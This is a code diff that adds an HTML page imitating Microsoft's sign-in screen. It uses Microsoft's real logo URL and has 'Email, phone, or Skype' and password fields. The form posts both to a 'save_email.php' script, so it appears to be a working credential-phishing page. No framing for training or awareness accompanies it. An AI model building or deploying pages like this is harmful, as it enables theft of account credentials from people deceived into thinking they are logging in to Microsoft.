@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign in</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            text-align: left;
+            width: 350px;
+        }
+        .login-container img {
+            width: 150px;
+            margin-bottom: 16px;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            margin: 0 0 16px;
+        }
+        .login-container p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 16px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .login-container a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-container .buttons {
+            margin-top: 16px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .login-container .buttons button {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-container .buttons button#back {
+            background: #f2f2f2;
+            color: #666;
+        }
+        .login-container .buttons button#next {
+            background: #0067b8;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+        <h1>Sign in</h1>
+        <form action="save_email.php" method="post" onsubmit="return validateForm()">
+            <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <p><a href="#">No account? Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+            <div class="buttons">
+                <button id="back" type="button">Back</button>
+                <button id="next" type="submit">Next</button>
+            </div>
+            <p id="message"></p>
+        </form>
+    </div>
+
+    <script>
+        function validateForm() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+
+            if (email && password) {
+                return true;
+            } else {
+                document.getElementById('message').innerText = 'Please enter both email and password.';
+                return false;
+            }
+        }
+    </script>
+</body>
+</html>
